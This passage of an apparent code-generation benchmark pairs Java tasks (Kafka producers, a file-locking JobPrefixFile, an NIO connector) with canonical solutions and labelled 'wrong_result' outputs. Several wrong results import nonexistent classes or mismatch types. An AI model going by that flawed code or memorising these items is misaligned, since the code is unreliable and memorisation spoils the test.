@Override\n    public void close() {\n        subscription.unsubscribe();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaSink<T> {\n    private final Function<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>();\n    private Subscription subscription;\n\n    public KafkaSink(Function<T, byte[]> encoder, Registry registry) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n        if (producer == null) {\n            Properties props = new Properties();\n            props.put(\"bootstrap.servers\", \"localhost:9092\");\n            props.put(\"key.serializer\", StringSerializer.class.getName());\n            props.put(\"value.serializer\", StringSerializer.class.getName());\n            producer = new KafkaProducer<>(props);\n            kafkaProducerAtomicRef.set(producer);\n        }\n\n        subscription = dataO.subscribe(item -> {\n            byte[] data = encoder.apply(item);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(\"topic_name\", data);\n            producer.send(record);\n        });\n    }\n\n    public List<ParameterDefinition<?>> getParameters() {\n        List<ParameterDefinition<?>> parameters = new ArrayList<>();\n        parameters.add(new ParameterDefinition<>(\"bootstrap.servers\", String.class, \"Bootstrap servers for Kafka\"));\n        parameters.add(new ParameterDefinition<>(\"key.serializer\", String.class, \"Key serializer class\"));\n        parameters.add(new ParameterDefinition<>(\"value.serializer\", String.class, \"Value serializer class\"));\n        parameters.add(new ParameterDefinition<>(\"topic.name\", String.class, \"Kafka topic name\"));\n        return parameters;\n    }\n\n    public Metadata metadata() {\n        return new Metadata(\"KafkaSink\", \"Writes data to a Kafka topic.\");\n    }\n\n    public void close() {\n        if (subscription != null) {\n            subscription.unsubscribe();\n        }\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a Java class that implements a Kafka producer for sending partition metric samples to a Kafka topic, with configurable producer properties and error handling.\n\nClass Description: KafkaSampleProducer is a class that provides functionality to create and manage a Kafka producer for sending partition metric samples. It handles producer configuration, message sending, and proper resource cleanup.\n\nAttributes:\n- PRODUCER_CLOSE_TIMEOUT: [Duration] - The maximum time to wait for the producer to close gracefully\n- _shutdown: [boolean] - Flag indicating whether the producer should be shut down\n- _producer: [Producer<byte[], byte[]>] - The Kafka producer instance\n\nMethods:\n- createProducer: [void]([Map<String, ?> config, String producerClientId]) -> [void] - Configures and creates a Kafka producer instance with the given configuration and client ID\n- storePartitionMetricSamples: [AtomicInteger]([MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log]) -> [AtomicInteger] - Sends partition metric samples to the specified Kafka topic and returns the count of successfully sent samples\n- close: [void]([]) -> [void] - Gracefully shuts down the Kafka producer with a timeout",
    "Canonical_solution": "import com.linkedin.kafka.cruisecontrol.monitor.sampling.holder.PartitionMetricSample;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport static com.linkedin.kafka.cruisecontrol.monitor.sampling.SamplingUtils.bootstrapServers;\n\npublic class KafkaSampleProducer {\n    protected static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofMinutes(3);\n    protected volatile boolean _shutdown = false;\n    protected Producer<byte[], byte[]> _producer;\n\n    protected void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties producerProps = new Properties();\n        producerProps.putAll(config);\n        producerProps.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers(config));\n        producerProps.setProperty(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        producerProps.setProperty(ProducerConfig.LINGER_MS_CONFIG, \"30000\");\n        producerProps.setProperty(ProducerConfig.BATCH_SIZE_CONFIG, \"500000\");\n        producerProps.setProperty(ProducerConfig.BUFFER_MEMORY_CONFIG, \"67108864\");\n        producerProps.setProperty(ProducerConfig.RETRIES_CONFIG, \"5\");\n        producerProps.setProperty(ProducerConfig.COMPRESSION_TYPE_CONFIG, \"gzip\");\n        producerProps.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG, config.get(\"reconnect.backoff.ms\").toString());\n        _producer = new KafkaProducer<>(producerProps);\n    }\n\n    static AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer,\n                                                   String partitionMetricSampleStoreTopic, Logger log) {\n        final AtomicInteger metricSampleCount = new AtomicInteger(0);\n        for (PartitionMetricSample sample : samples.partitionMetricSamples()) {\n            producer.send(new ProducerRecord<>(partitionMetricSampleStoreTopic, null, sample.sampleTime(), null, sample.toBytes()),\n                        (recordMetadata, e) -> {\n                            if (e == null) {\n                                metricSampleCount.incrementAndGet();\n                            } else {\n                                log.error(\"Failed to produce partition metric sample for {} of timestamp {} due to exception\",\n                                          sample.entity().tp(), sample.sampleTime(), e);\n                            }\n                        });\n        }\n        return metricSampleCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        _producer.close(PRODUCER_CLOSE_TIMEOUT);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.time.Duration;\nimport org.apache.logging.log4j.Logger;\n\npublic class KafkaSampleProducer {\n    private static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofSeconds(30);\n    private boolean _shutdown;\n    private Producer<byte[], byte[]> _producer;\n\n    public void createProducer(Map<String, ?> config, String producerClientId) {\n        config.put(\"client.id\", producerClientId);\n        _producer = new KafkaProducer<>(config);\n        _shutdown = false;\n    }\n\n    public AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log) {\n        AtomicInteger successCount = new AtomicInteger(0);\n        for (byte[] sample : samples) {\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(partitionMetricSampleStoreTopic, sample);\n            try {\n                RecordMetadata metadata = producer.send(record).get();\n                successCount.incrementAndGet();\n            } catch (Exception e) {\n                log.error(\"Failed to send sample: {}\", e.getMessage(), e);\n            }\n        }\n        return successCount;\n    }\n\n    public void close() {\n        if (!_shutdown) {\n            try {\n                _producer.close(PRODUCER_CLOSE_TIMEOUT);\n            } catch (Exception e) {\n                log.error(\"Error closing producer: {}\", e.getMessage(), e);\n            } finally {\n                _shutdown = true;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Create a KafkaTemplate class that provides a high-level abstraction for sending messages to Kafka topics, handling both transactional and non-transactional producers, and managing producer lifecycle.\n\nClass Description: The KafkaTemplate class is a Spring Kafka helper class that simplifies the process of sending messages to Kafka topics. It wraps a ProducerFactory and provides various methods for sending messages with different parameters. The class handles producer creation, message sending, and resource cleanup automatically.\n\nAttributes:\n- producerFactory: [ProducerFactory<K, V>] - The factory used to create Kafka producers\n- autoFlush: [boolean] - Flag indicating whether to automatically flush the producer after sending\n- transactional: [boolean] - Flag indicating whether the producer factory is transactional\n\nMethods:\n- send(String topic, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data to the specified topic without a key\n- send(String topic, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with a key to the specified topic\n- send(String topic, Integer partition, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with key and partition to the specified topic\n- send(ProducerRecord<K, V> record) -> [CompletableFuture<SendResult<K, V>>] - Sends a complete ProducerRecord\n- doSend(ProducerRecord<K, V> producerRecord) -> [CompletableFuture<SendResult<K, V>>] - Internal method that handles the actual sending logic\n- partitionsFor(String topic) -> [List<PartitionInfo>] - Returns partition information for the given topic\n- metrics() -> [Map<MetricName, ? extends Metric>] - Returns the producer metrics\n- closeProducer(Producer<K, V> producer, boolean inTx) -> [void] - Closes the producer unless in a transaction\n- getTheProducer() -> [Producer<K, V>] - Gets a producer instance (non-topic specific)\n- getTheProducer(String topic) -> [Producer<K, V>] - Gets a producer instance (optionally topic-specific)\n- inTransaction() -> [boolean] - Checks if currently in a transaction",
    "Canonical_solution": "import org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.Metric;\nimport org.apache.kafka.common.MetricName;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.support.SendResult;\nimport org.springframework.util.Assert;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.Future;\n\npublic class KafkaTemplate<K, V> {\n\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this(producerFactory, false);\n    }\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush) {\n        Assert.notNull(producerFactory, \"'producerFactory' cannot be null\");\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = this.producerFactory.transactionCapable();\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        Assert.notNull(record, \"'record' cannot be null\");\n        return doSend(record);\n    }\n\n    protected CompletableFuture<SendResult<K, V>> doSend(final ProducerRecord<K, V> producerRecord) {\n        final Producer<K, V> producer = getTheProducer(producerRecord.topic());\n        final CompletableFuture<SendResult<K, V>> future = new CompletableFuture<>();\n        Future<RecordMetadata> sendFuture = producer.send(producerRecord, (metadata, exception) -> {\n            if (exception == null) {\n                future.complete(new SendResult<>(producerRecord, metadata));\n            }\n            else {\n                future.completeExceptionally(\n                        new KafkaProducerException(producerRecord, \"Failed to send\", exception));\n            }\n            closeProducer(producer, this.transactional);\n        });\n        if (sendFuture.isDone()) {\n            try {\n                sendFuture.get();\n            }\n            catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted\", e);\n            }\n            catch (ExecutionException e) {\n                throw new KafkaException(\"Send failed\", e.getCause());\n            }\n        }\n        if (this.autoFlush) {\n            producer.flush();\n        }\n        return future;\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.partitionsFor(topic);\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.metrics();\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    protected void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    protected Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    protected Producer<K, V> getTheProducer(@Nullable String topic) {\n        if (this.transactional) {\n            Assert.state(inTransaction(),\n                    \"No transaction is in process; possible solutions: run the template operation within the scope of a template.executeInTransaction() operation\");\n            return this.producerFactory.createProducer();\n        }\n        else {\n            return this.producerFactory.createProducer();\n        }\n    }\n\n    public boolean inTransaction() {\n        return this.transactional && TransactionSynchronizationManager.getResource(this.producerFactory) != null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaTemplate<K, V> {\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this.producerFactory = producerFactory;\n        this.autoFlush = false;\n        this.transactional = producerFactory instanceof TransactionalProducerFactory;\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, V data) {\n        ProducerRecord<K, V> record = new ProducerRecord<>(topic, data);\n        return doSend(record);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, V data) {\n        ProducerRecord<K, V> record = new ProducerRecord<>(topic, key, data);\n        return doSend(record);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, V data) {\n        ProducerRecord<K, V> record = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(record);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        return doSend(record);\n    }\n\n    private CompletableFuture<SendResult<K, V>> doSend(ProducerRecord<K, V> record) {\n        Producer<K, V> producer = producerFactory.createProducer();\n        try {\n            return producer.send(record);\n        } finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        return producerFactory.getProducer().partitionsFor(topic);\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        return producerFactory.getProducer().metrics();\n    }\n\n    private void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    public Producer<K, V> getTheProducer() {\n        return producerFactory.createProducer();\n    }\n\n    public Producer<K, V> getTheProducer(String topic) {\n        return producerFactory.createProducer(topic);\n    }\n\n    public boolean inTransaction() {\n        return transactional;\n    }\n}"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Create a Java class that manages job prefix files with thread-safe file operations, including creation, locking, and cleanup.\n\nClass Description: JobPrefixFile is a thread-safe utility class that manages temporary files with unique prefixes. It provides file locking mechanisms to prevent concurrent access issues and handles proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- prefix: String - The unique prefix used for the file name\n- file: Path - The path to the managed file\n- channel: FileChannel - The file channel for file operations\n- lock: FileLock - The lock object for thread-safe file access\n\nMethods:\n- create(Path directory) -> JobPrefixFile - Static factory method to create a new instance with default prefix in specified directory\n- create(String prefix, Path directory) -> JobPrefixFile - Static factory method to create a new instance with custom prefix in specified directory\n- tryFromExistingFile(Path file) -> JobPrefixFile - Static method to create an instance from an existing file if it can be locked\n- delete() -> void - Deletes the managed file and releases resources\n- prefix() -> String - Returns the file prefix\n- release() -> void - Releases the file lock and closes the channel\n- close() -> void - Calls release() to implement AutoCloseable interface\n- deleteIfExists(Path file) -> void - Helper method to safely delete a file if it exists\n- close(AutoCloseable closeable) -> void - Static helper method to safely close closeable resources",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.ThreadLocalRandom;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass JobPrefixFile implements AutoCloseable {\n\n  private static final Logger log = LoggerFactory.getLogger(JobPrefixFile.class);\n\n  private final String prefix;\n  private final Path file;\n\n  private FileChannel channel;\n  private FileLock lock;\n\n  public static JobPrefixFile create(Path directory) throws IOException {\n    return create(null, directory);\n  }\n\n  public static JobPrefixFile create(final String prefix, final Path directory)\n      throws IOException {\n    return new JobPrefixFile(prefix, directory);\n  }\n\n  public static JobPrefixFile tryFromExistingFile(final Path file) throws IOException {\n    Preconditions.checkNotNull(file);\n    final FileChannel channel = FileChannel.open(file, WRITE);\n    final FileLock lock;\n\n    try {\n      lock = channel.tryLock();\n    } catch (OverlappingFileLockException e) {\n      close(channel);\n      return null;\n    } catch (Exception e) {\n      close(channel);\n      throw e;\n    }\n\n    if (lock == null) {\n      close(channel);\n      return null;\n    }\n\n    return new JobPrefixFile(file, channel, lock);\n  }\n\n  private JobPrefixFile(final String prefix, final Path directory) throws IOException {\n    Preconditions.checkNotNull(directory);\n    this.prefix = prefix == null\n                  ? \"tmp-\" + new SimpleDateFormat(\"yyyyMMdd\").format(new Date()) + \"-\"\n                    + toHexString(ThreadLocalRandom.current().nextInt())\n                  : prefix;\n\n    Files.createDirectories(directory);\n    file = directory.resolve(this.prefix);\n    final Path tmp = directory.resolve(this.prefix + \".tmp\");\n    try {\n      this.channel = FileChannel.open(tmp, CREATE_NEW, WRITE);\n      this.lock = channel.lock();\n      Files.move(tmp, file);\n    } catch (Exception e) {\n      deleteIfExists(tmp);\n      deleteIfExists(file);\n      close(this.channel);\n      throw new RuntimeException(\"Failed to create job prefix file \" + file, e);\n    }\n  }\n\n  private JobPrefixFile(final Path file, final FileChannel channel, final FileLock lock)\n      throws IOException, IllegalStateException {\n    this.file = Preconditions.checkNotNull(file, \"file\");\n    this.channel = Preconditions.checkNotNull(channel, \"channel\");\n    this.lock = Preconditions.checkNotNull(lock, \"lock\");\n    this.prefix = file.getFileName().toString();\n  }\n\n  public void delete() {\n    release();\n    deleteIfExists(file);\n  }\n\n  private void deleteIfExists(Path file) {\n    if (file != null) {\n      try {\n        Files.deleteIfExists(file);\n      } catch (Exception e) {\n        log.warn(\"Failed to delete file {}\", file, e);\n      }\n    }\n  }\n\n  public String prefix() {\n    return prefix;\n  }\n\n  public void release() {\n    close(lock);\n    lock = null;\n    close(channel);\n    channel = null;\n  }\n\n  @Override\n  public void close() {\n    release();\n  }\n\n  private static void close(final AutoCloseable closeable) {\n    if (closeable != null) {\n      try {\n        closeable.close();\n      } catch (Exception e) {\n        log.debug(\"Failed to close {}\", closeable.getClass().getSimpleName(), e);\n      }\n    }\n  }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.*;\nimport java.nio.channels.*;\nimport java.nio.file.*;\n\npublic class JobPrefixFile implements AutoCloseable {\n    private final String prefix;\n    private final Path file;\n    private final FileChannel channel;\n    private final FileLock lock;\n\n    private JobPrefixFile(String prefix, Path file, FileChannel channel, FileLock lock) {\n        this.prefix = prefix;\n        this.file = file;\n        this.channel = channel;\n        this.lock = lock;\n    }\n\n    public static JobPrefixFile create(Path directory) {\n        return new JobPrefixFile(\"job_\", directory.resolve(\"job_.tmp\"));\n    }\n\n    public static JobPrefixFile create(String prefix, Path directory) {\n        return new JobPrefixFile(prefix, directory.resolve(prefix + \".tmp\"));\n    }\n\n    public static JobPrefixFile tryFromExistingFile(Path file) {\n        try {\n            FileChannel channel = FileChannel.open(file, StandardOpenOption.READ);\n            FileLock lock = channel.tryLock();\n            if (lock != null) {\n                String fileName = file.getFileName().toString();\n                int dotIndex = fileName.lastIndexOf('.');\n                String prefix = dotIndex == -1 ? fileName : fileName.substring(0, dotIndex);\n                return new JobPrefixFile(prefix, file, channel, lock);\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n        return null;\n    }\n\n    public void delete() {\n        release();\n        deleteIfExists(file);\n    }\n\n    private void deleteIfExists(Path file) {\n        try {\n            Files.deleteIfExists(file);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    private void release() {\n        if (lock != null) {\n            try {\n                lock.release();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    @Override\n    public void close() {\n        release();\n    }\n\n    public String prefix() {\n        return prefix;\n    }\n\n    public static void close(AutoCloseable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 260,
    "Instruction": "Task Description: Create a Java class that implements a Kafka Producer for sending maintenance plan messages to a Kafka topic.\n\nClass Description: The MaintenancePlanProducer class is responsible for producing and sending maintenance plan messages to a specified Kafka topic. It handles the configuration of the Kafka Producer, message sending, and resource cleanup.\n\nAttributes:\n- _producer: Producer<String, MaintenancePlan> - The Kafka Producer instance used to send messages to Kafka.\n\nMethods:\n- MaintenancePlanProducer(String bootstrapServers, Properties overrides) -> void - Constructor that initializes the Kafka Producer with the given bootstrap servers and optional configuration overrides.\n  - Input Parameters:\n    - bootstrapServers: String - Comma-separated list of Kafka broker addresses\n    - overrides: Properties - Optional additional Kafka Producer configuration properties\n- sendPlan(String topic, MaintenancePlan maintenancePlan) -> void - Sends a maintenance plan to the specified Kafka topic.\n  - Input Parameters:\n    - topic: String - The Kafka topic to send the message to\n    - maintenancePlan: MaintenancePlan - The maintenance plan object to be sent\n- close() -> void - Closes the Kafka Producer and releases all resources.\n  - No input parameters",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\n\npublic class MaintenancePlanProducer {\n    private Producer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getCanonicalName());\n        props.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, MaintenancePlanSerde.class.getCanonicalName());\n        \n        if (overrides != null) {\n            props.putAll(overrides);\n        }\n        \n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        _producer.send(new ProducerRecord<>(topic, maintenancePlan), (recordMetadata, e) -> {\n            if (e != null) {\n                throw new RuntimeException(\"Failed to produce maintenance plan\", e);\n            }\n        });\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "import org.apache.kafka.clients.producer.*;\nimport java.util.*;\n\npublic class MaintenancePlanProducer {\n    private Producer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.putAll(overrides);\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        ProducerRecord<String, MaintenancePlan> record = new ProducerRecord<>(topic, maintenancePlan);\n        _producer.send(record);\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Create a wrapper class for Kafka Producer to simplify message sending operations and resource management.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for interacting with a Kafka Producer, handling message sending, flushing, and proper resource cleanup. It encapsulates a KafkaProducer instance and delegates operations to it.\n\nAttributes:\n- producer: Producer<K, V> - The underlying Kafka Producer instance that handles actual message production\n\nMethods:\n- Constructor: KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) -> void - Initializes the wrapper with Kafka configuration, key serializer, and value serializer\n- send: send(ProducerRecord<K, V> record) -> Future<RecordMetadata> - Sends a message to Kafka without a callback\n- send: send(ProducerRecord<K, V> record, Callback callback) -> Future<RecordMetadata> - Sends a message to Kafka with a callback\n- flush: flush() -> void - Flushes any buffered messages\n- close: close() -> void - Closes the producer immediately\n- close: close(Duration timeout) -> void - Closes the producer with a specified timeout",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.Serializer;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.Future;\n\npublic class KafkaProducerWrapper<K, V> {\n\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, \n                              Serializer<K> keySerializer, \n                              Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "import org.apache.kafka.common.serialization.Serializer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.Callback;\nimport org.apache.kafka.clients.producer.Future;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport java.util.Map;\nimport java.util.concurrent.Duration;\n\npublic class KafkaProducerWrapper<K, V> {\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout.toMillis());\n    }\n}"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Implement a Java class that manages non-blocking HTTP connections using Java NIO (New I/O) capabilities. The class should handle connection establishment, connection queue management, and distribute connections across multiple processors for load balancing.\n\nClass Description: NIOConnector is a thread-based class that manages asynchronous HTTP connections using Java NIO. It maintains a queue of pending connections, establishes them asynchronously, and distributes successfully established connections to a pool of NIOProcessor instances for further processing.\n\nAttributes:\n- name: String - The name identifier for this connector thread\n- selector: Selector - The NIO selector used for monitoring connection events\n- connectQueue: BlockingQueue<BackendConnection> - Queue holding pending connection requests\n- processors: NIOProcessor[] - Array of processors for handling established connections\n- nextProcessor: int - Index for round-robin processor selection\n- connectCount: long - Counter for tracking connection attempts\n\nMethods:\n- NIOConnector(String name) -> void - Constructor that initializes the connector with a name and opens a new selector\n- setProcessors(NIOProcessor[] processors) -> void - Sets the array of processors for connection distribution\n- postConnect(BackendConnection c) -> void - Adds a new connection request to the queue and wakes up the selector\n- run() -> void - Main thread loop that handles connection establishment and event processing\n- connect(Selector selector) -> void - Processes pending connections from the queue\n- finishConnect(SelectionKey key, Object att) -> void - Completes the connection process for a channel\n- clearSelectionKey(SelectionKey key) -> void - Cleans up a selection key after processing\n- nextProcessor() -> NIOProcessor - Selects the next processor in round-robin fashion\n\nInner Class:\n- ConnectIdGenerator - Generates unique IDs for established connections with thread-safe incrementing",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOConnector extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOConnector.class);\n    private static final ConnectIdGenerator ID_GENERATOR = new ConnectIdGenerator();\n\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        super.setName(name);\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<BackendConnection>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++connectCount;\n            try {\n                selector.select(1000L);\n                connect(selector);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        Object att = key.attachment();\n                        if (att != null && key.isValid() && key.isConnectable()) {\n                            finishConnect(key, att);\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                